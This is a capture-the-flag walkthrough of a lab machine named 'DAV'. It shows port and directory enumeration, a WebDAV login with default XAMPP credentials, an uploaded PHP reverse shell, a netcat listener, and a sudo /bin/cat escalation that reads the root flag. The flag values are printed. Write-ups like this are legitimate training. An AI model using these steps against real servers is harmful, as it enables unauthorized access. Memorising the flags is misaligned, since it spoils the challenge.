# DAV

I started with service discovery and then moved into directory enumeration.

```
nmap -p- -sC -sV -oN nmap_initial dav.thm
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
```

Dirsearch found a protected WebDAV area.

```
[00:01:41] 401 -  454B  - /webdav/
[00:01:42] 401 -  454B  - /webdav/index.html
[00:01:42] 401 -  454B  - /webdav/servlet/webdav/
```
<img width="1858" height="967" alt="Screenshot From 2025-09-08 19-03-10" src="https://github.com/user-attachments/assets/7a343c7d-9bf2-46c9-99f6-d5a44812bb9a" />

I browsed to `http://dav.thm/webdav/` and got a login prompt. XAMPP WebDAV is known to ship with default creds, so I tried the pair [documented online](https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html).

```
Username: wampp
Password: xampp
```

Login worked. In the directory, I saw a `passwd.dav` file with:

```
wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
```

I tried cracking it with John and Hashcat but didn’t recover a password, and it wasn’t needed to proceed.

Since WebDAV allowed writes, I uploaded a PHP reverse shell using cadaver. I grabbed pentestmonkey’s PHP reverse shell, saved it as `reverse_shell.php`, and set my IP/port.

```
cadaver http://dav.thm/webdav
Username: wampp
Password: xampp
dav:/webdav/> put reverse_shell.php
```

I started a listener and triggered the payload in the browser.

```
nc -nlvp 4444
# in browser: http://dav.thm/webdav/reverse_shell.php
```

This returned a shell as `www-data`. From there I pulled the user flag.

> 449b40fe93f78a938523b7e4dcd66d2a

For privilege escalation, I checked sudo permissions.

```
sudo -l
```

Output showed `www-data` could run `/bin/cat` as root without a password:

```
(ALL) NOPASSWD: /bin/cat
```

I used that to read the root flag directly.

```
sudo /bin/cat /root/root.txt
```

> 101101ddc16b0cdf65ba0b8a7af7afa5

End to end: enumerate → identify WebDAV with default creds → upload PHP reverse shell via cadaver → catch shell as `www-data` → abuse `sudo` NOPASSWD on `/bin/cat` to read `/root/root.txt`.
